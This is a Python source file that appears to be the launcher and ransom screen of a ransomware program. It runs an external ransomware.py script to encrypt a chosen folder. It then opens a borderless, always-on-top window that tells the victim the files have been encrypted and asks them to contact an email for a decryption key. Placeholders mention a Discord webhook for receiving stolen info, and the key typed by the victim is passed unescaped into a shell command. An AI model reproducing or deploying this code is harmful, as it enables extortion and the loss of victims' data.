import os
import tkinter as tk

email = 'contact email, or some sort of contact'
discord_webhook = 'webhook to recieve the info'
encrypt_directory = os.path.join(os.getcwd(), 'add test folder name here')
ransomware = True

if ransomware:
    files = os.listdir(encrypt_directory)
    for file in files:
        print(file)
    os.system(f'python3 ransomware.py --directory {encrypt_directory}')

def save_key(root, key_entry, status_label):
    key = key_entry.get()
    if key:
        os.system(f'python3 ransomware.py --key {key} --directory {encrypt_directory}')
        root.destroy()  
    else:
        status_label.config(text="Please enter a decryption key.")

def ransom_gui():
    root = tk.Tk()
    root.title("COMPUTER HAS BEEN SEIZED")
    root.attributes("-topmost", True)
    root.overrideredirect(True)  # Remove the top bar with close button

    window_width = 1600
    window_height = 1000
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    x_coordinate = (screen_width / 2) - (window_width / 2)
    y_coordinate = (screen_height / 2) - (window_height / 2)
    root.geometry("%dx%d+%d+%d" % (window_width, window_height, x_coordinate, y_coordinate))

    # Title label
    title_label = tk.Label(root, text="Womp Womp", font=("Helvetica", 24, "bold"))
    title_label.place(relx=0.5, rely=0.1, anchor="center")

    # Message label
    message_label = tk.Label(root, text=f"Your files have been encrypted with military grade encryption.\nContact {email} to decrypt them.",
                             font=("Helvetica", 16))
    message_label.place(relx=0.5, rely=0.5, anchor="center")

    # Input box for entering key
    key_entry = tk.Entry(root, font=("Helvetica", 14))
    key_entry.place(relx=0.5, rely=0.8, anchor="center")

    # Button to save key
    decrypt_button = tk.Button(root, text="Decrypt Files", font=("Helvetica", 14), command=lambda: save_key(root, key_entry, status_label))
    decrypt_button.place(relx=0.5, rely=0.85, anchor="center")

    # Status label to show message
    status_label = tk.Label(root, text="", font=("Helvetica", 14))
    status_label.place(relx=0.5, rely=0.9, anchor="center")

    root.mainloop()

ransom_gui()
